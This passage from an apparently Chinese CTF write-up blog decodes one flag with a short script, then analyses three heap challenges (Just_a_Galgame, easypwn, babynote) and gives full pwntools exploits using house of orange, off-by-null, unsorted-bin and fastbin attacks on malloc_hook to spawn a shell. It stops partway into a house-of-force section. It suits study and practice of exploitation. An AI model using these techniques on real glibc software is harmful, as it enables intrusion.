class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]tag2 = [<span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x5C</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>,<span class="hljs-number">0x5E</span>]qwkey = [<span class="hljs-string">'Q'</span>, <span class="hljs-string">'W'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'s'</span>]flag = <span class="hljs-string">''</span>i = <span class="hljs-number">0</span>j = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tag2)):    <span class="hljs-keyword">if</span> j ==<span class="hljs-number">7</span>:        j = <span class="hljs-number">0</span>    flag += chr((tag2[i] - <span class="hljs-number">65</span>) ^ ord(qwkey[j % <span class="hljs-number">7</span>]))    j += <span class="hljs-number">1</span>print(str(flag))</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>估计没有提取全，但是也很容易知道flag了。</p><div class="hljs"><pre><code class="hljs python">flag&#123;QWB_water_problem_give_you_the_score&#125;</code></pre></div><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。</p><p>题目的case2 <code>Invite her to go to a movie.</code> 中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"movie name &gt;&gt; "</span>, &amp;buf);          v4 = atoi((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;buf);          read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(qword_404060[v4] + <span class="hljs-number">0x60</span>), <span class="hljs-number">0x10</span>uLL);</code></pre></div><p>由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。</p><p>并且case3：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"You are the apple of my eyes too!"</span>);        qword_404098 = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);        ++v12;</code></pre></div><p>可以给你申请0x1000的堆块，这就可以实现了house of orange。</p><p>在case5中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>);      read(<span class="hljs-number">0</span>, &amp;key, <span class="hljs-number">8u</span>LL);</code></pre></div><p>会给<code>0x4040A0</code> 读一段数据。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>house of orange来获取一个unsortbin </li><li>申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址</li><li>show一下，泄漏出libc base</li><li>leave <code>__malloc_hook - 0x60</code>的地址在<code>key</code> 处，然后进行编辑这里的数据。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./Just_a_Galgame'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add100</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(buf)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    s(str(buf))add()payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0xd41</span>)edit(<span class="hljs-number">0</span>,payload)add100()add()show()ru(<span class="hljs-string">'1: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec2a0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)leave(p64(libc_base + <span class="hljs-number">0x3ebc30</span> - <span class="hljs-number">0x60</span>))one_rec = <span class="hljs-number">0x4f3c2</span> + libc_baseedit(<span class="hljs-number">8</span>,p64(one_rec))add()itr()</code></pre></div><p>还是挺简单的，比赛时竟然没有看这个题。</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</code></pre></div><ul><li><p>禁用了fastbin，原理就是修改<code>global_max_fast</code> = 0x10</p></li><li><p>存在off by null</p></li><li><p>没有show功能</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></li><li><p>利用off by null ，修改unsorted bin 的bk为<code>global_max_fast - 0x10</code></p></li><li><p>利用unsorted bin 攻击 <code>global_max_fast</code></p></li><li><p>接着fastbin attack 打io file的stdout，泄漏libc</p></li><li><p>接着fastbin attack打 <code>malloc_hook</code> 为one gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easypwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'39.101.184.181'</span>,<span class="hljs-number">10000</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc-easypwn.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x40</span>)    delete(<span class="hljs-number">0</span>)    <span class="hljs-comment">#null off by one</span>    edit(<span class="hljs-number">1</span>,<span class="hljs-string">'d'</span>*<span class="hljs-number">0x90</span> + p64(<span class="hljs-number">0xa0</span> + <span class="hljs-number">0x40</span>))    delete(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0xe8</span> - <span class="hljs-number">0x30</span>)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0x20</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) +p64(<span class="hljs-number">0</span>)+ p16(<span class="hljs-number">0x57f8</span>- <span class="hljs-number">0x10</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p16(<span class="hljs-number">0x45cf</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0xe8</span>)    edit(<span class="hljs-number">6</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x41</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>) + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./easypwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">143</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)edit(<span class="hljs-number">7</span>,<span class="hljs-string">'\0'</span> * <span class="hljs-number">0xe1</span> + p32(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">'\n'</span>)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">376</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)rec = libc_addr + <span class="hljs-number">0xf0364</span><span class="hljs-comment"># realloc = libc_addr + libc.symbols['realloc'] + realloc[1]</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0xa0</span> + p64(rec) + p64(rec) + <span class="hljs-string">'\n'</span>edit(<span class="hljs-number">8</span>, payload)info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)add(<span class="hljs-number">0xe8</span>)itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>(name, &amp;s);</code></pre></div><div class="hljs"><pre><code class="hljs c">__isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;age1); <span class="hljs-comment">// 长整数</span></code></pre></div><p>可能造成溢出。在栈中，其下面紧挨着age。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p><p>在bss段，其下面紧挨着heap存放的地址。</p><h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul><li>只能申请6个堆。</li><li>申请了一个堆，其size放在距离其堆地址·<code>6 * 8</code>的位置。</li><li>可以根据堆序号申请堆，判断堆序号是否存在的依据：此堆对应的size位有没有数值（也适用于shownote，deletenote,editnote）<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> )                                <span class="hljs-comment">// 可以输入负数</span>  &#123;    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">4L</span>L)]);<span class="hljs-comment">// 反编译错了 是8 *（xx）</span>      *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] = <span class="hljs-number">0L</span>L;<span class="hljs-comment">//uaf heap没有清0,size 清0</span>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);    &#125;</code></pre></div><ul><li>存在uaf</li><li>只能删除<code>idx&lt;=3</code> 的堆</li><li>可以输入负堆号，可以根据其逻辑来删除一些特殊的堆</li></ul><h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> &amp;&amp; v1 &gt;= <span class="hljs-number">0</span> )</code></pre></div><ul><li>只能编辑前4个堆</li></ul><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>leak libc</li><li>free(-1) free(-2) 删除掉motto name的堆块</li><li>利用reset，调用regist，利用strcpy来溢出age的数值，控制第一个chunk的size，造成一个堆块重叠</li><li>删除0、1、2chunk，申请一个大的chunk，可以覆盖到chunk 1的fd从而修改，进行fastbin attack</li><li>打malloc hook 为 one gadget</li></ul><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babynotes'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reg</span><span class="hljs-params">(name,motto,age)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'motto'</span>,str(motto))    sla(<span class="hljs-string">'age'</span>,str(age))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    <span class="hljs-comment"># if int(idx) &lt;=3:</span>    sla(<span class="hljs-string">'dex'</span>,str(idx))    <span class="hljs-comment"># if int(idx) &gt;3:</span>        <span class="hljs-comment"># idx = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">(name,motto,age)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    reg(name,motto,age)name = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x18</span>motto = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x20</span>age = <span class="hljs-number">0x100</span>reg(name,motto,age)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>) add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x100</span>) add(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>) free(<span class="hljs-number">3</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)show(<span class="hljs-number">5</span>)ru(<span class="hljs-string">'ote 5: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)free(<span class="hljs-number">-1</span>)free(<span class="hljs-number">-2</span>)age = <span class="hljs-number">0x1111111100000141</span>reset(name,<span class="hljs-string">' '</span>,age)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basepayload = <span class="hljs-number">11</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook)edit(<span class="hljs-number">0</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) * <span class="hljs-string">'1'</span> + p64(<span class="hljs-number">0</span>) + p64(one)edit(<span class="hljs-number">3</span>,payload)free(<span class="hljs-number">3</span>)itr()</code></pre></div><p>还有一种思路，就是因为bss段的age，free（-3）也可以进行free的，控制其为一个0x68堆块地址的话，就可以出现一个0x70的fastbin块，然后其size是不会北抹除的，所以利用uaf直接edit其fd为malloc hook，fastbin attack 攻击即可。</p><h3 id="另一种打法"><a href="#另一种打法" class="headerlink" title="另一种打法"></a>另一种打法</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input note size: "</span>);   __isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;size);   <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> __int64)size &lt;= <span class="hljs-number">0x100</span> )   &#123;</code></pre></div><p>这里有个遗漏点，add的size是可以输入负的</p><h4 id="house-of-force使用条件"><a href="#house-of-force使用条件" class="headerlink" title="house of  force使用条件"></a>house of  force使用条件</h4><p>比赛时没有想到，因为house of  force相关的有点遗忘了。</p><ul><li>可以溢出到top chunk的 size，篡改 size 为一个很大值,就可以轻松的通过top chunk的相关验证，常见就是修改为 <code>-1</code> 